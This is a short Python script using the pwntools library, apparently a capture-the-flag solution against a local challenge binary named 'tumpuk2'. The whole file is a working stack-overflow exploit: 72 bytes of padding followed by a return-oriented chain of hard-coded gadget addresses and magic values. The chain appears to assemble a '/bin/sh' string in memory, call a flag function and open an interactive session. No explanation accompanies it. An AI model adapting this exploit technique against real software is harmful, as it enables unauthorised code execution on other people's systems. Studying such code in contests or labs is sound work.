from pwn import *

def exploit():
    p = process("./tumpuk2")
    padding = "A" * 72
    ramuan = p32(0x0804854d)
    gadget = p32(0x0804836e)
    condition1 = p32(0xdeadbeef)
    binsh = p32(0x0804a03c)
    binsh2 = p32(0x0804a03c+1)
    binsh3 = p32(0x0804a03c+4)
    binsh4 = p32(0x0804a03c+5)
    pager = p32(0x08048670)
    bins = p32(0x08048672)
    sh = p32(0x08048676)
    flag = p32(0x08048516)
    condition2 = p32(0xfacebabe)
    condition3 = p32(0xbeefdead)
    #payload = padding + ramuan + gadget + condition1 + binsh + pager
    #payload += ramuan + gadget + condition1 + binsh2 + bins
    #payload += ramuan + gadget + condition1 + binsh3 + pager
    #payload += ramuan + gadget + condition1 + binsh4 + sh
    #payload += flag + "JUNK" + condition2 + condition3
    p.sendline(padding+
                ramuan+
                gadget+
                condition1+
                binsh+
                pager+
                ramuan+
                gadget+
                condition1+
                binsh2+
                bins+
                ramuan+
                gadget+
                condition1+
                binsh3+
                pager+
                ramuan+
                gadget+
                condition1+
                binsh4+
                sh+
                flag+
                "JUNK"+
                condition2+
                condition3)
    p.interactive()

if __name__ == "__main__":
    exploit()
